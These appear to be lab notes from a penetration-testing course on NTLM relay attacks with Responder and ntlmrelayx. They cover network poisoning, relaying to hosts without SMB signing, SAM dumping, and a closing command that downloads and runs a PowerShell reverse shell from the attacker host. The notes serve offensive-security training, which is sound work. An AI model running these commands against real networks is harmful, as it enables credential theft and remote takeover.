Many tools can be used to start relay servers and clients and conduct post-relay attacks; we will focus on [Impacket’s](https://github.com/fortra/impacket/tree/master) [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) in this module. Although other tools like [MultiRelay.py](https://github.com/lgandx/Responder/blob/master/tools/MultiRelay.py) or [Inveigh](https://github.com/Kevin-Robertson/Inveigh/tree/master) (primarily used on Windows) can also be used.

## Responder Configuration File
We can change the default configuration using Responder’s configuration file `Responder/Responder.conf`. If we want to relay `HTTP`, we need to set it to Off before trying to relay it.

To turn off the `SMB` server in Responder, we must change `SMB = On` to `SMB = Off`. The same applies to any other protocol. This is because `ntlmrelayx` runs `SMB` or `HTTP` server so it can relay the connection from the clients to the server, and if `Responder` is running those services, we won’t be able to use `ntlmrelayx`.

## NTLM Relay over SMB
In the previous section, we used `CrackMapExec`’s `--gen-relay-list` command to hunt for relay targets with SMB signing disabled, finding 172.16.117.50 and 172.16.117.60:
```
cat relayTargets.txt

172.16.117.50
172.16.117.60
```

To relay an authentication to one of these IPs, we need to poison the network using Responder and wait until a user or computer performs an action that provokes a broadcast or any other activity that we can intercept and force that session to authenticate to our attack host.

Let’s use `Responder` to poison the network:
```
sudo python3 Responder.py -I ens192
```

Next, we need to use `ntlmrelayx` to perform the NTLM Relay attack. `ntlmrelayx` provides the options `-t` and `-tf` for specifying relay targets, `ntlmrelayx` will relay the `NTLM` authentication over to the originating host, an attack called the `NTLM` `self-relay` attack (although patched, if we encounter legacy vulnerable hosts, considering this attack might prove helpful). The `-smb2support` option provides SMBv2 support for hosts requiring it:
```
ntlmrelayx.py -tf relayTargets.txt -smb2support
```

By default, `ntlmrelayx` will relay the NTLM authentication over `SMB`. If the session we relayed has highly privileged access on the target machine, `ntlmrelayx` will try to perform a `SAM dump`.

The below diagram showcases the attack we executed:
[[Z Assets/Images/Pasted image 20250915024554.jpeg|Open: Pasted image 20250915024554.png]]
![[Z Assets/Images/Pasted image 20250915024554.jpeg]]
As illustrated in the image above, here’s a simplification of what happened:

1. We started `Responder` & `ntlmrelayx` on the Attack machine (172.16.117.30).
2. Once a user from the DC (172.16.117.3) mistypes a `UNC` and Windows tries to connect to it, `Responder` poisons their responses and redirect the user to authenticate against our Attack machine.
3. When they connected to our attack host, `ntlmrelayx` relayed those authentications to the servers that were configured as targets (172.16.117.50 and 172.16.117.60), and the user `INLANEFREIGHT/PETER` was an administrator on one of the computer `172.16.117.50`, which caused a `SAM dump`.
---
## Command Execution

Instead of performing a `SAM dump`, we can perform command execution on the target machine using the option `-c "Command To Execute"`, and the commands will be executed via `SMB`. we can get a reverse shell, let’s use [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) from [Nishang](https://github.com/samratashok/nishang) for that.
```
sudo ntlmrelayx.py -tf relayTargets.txt -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://172.16.117.30:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 172.16.117.30 -Port 7331"
```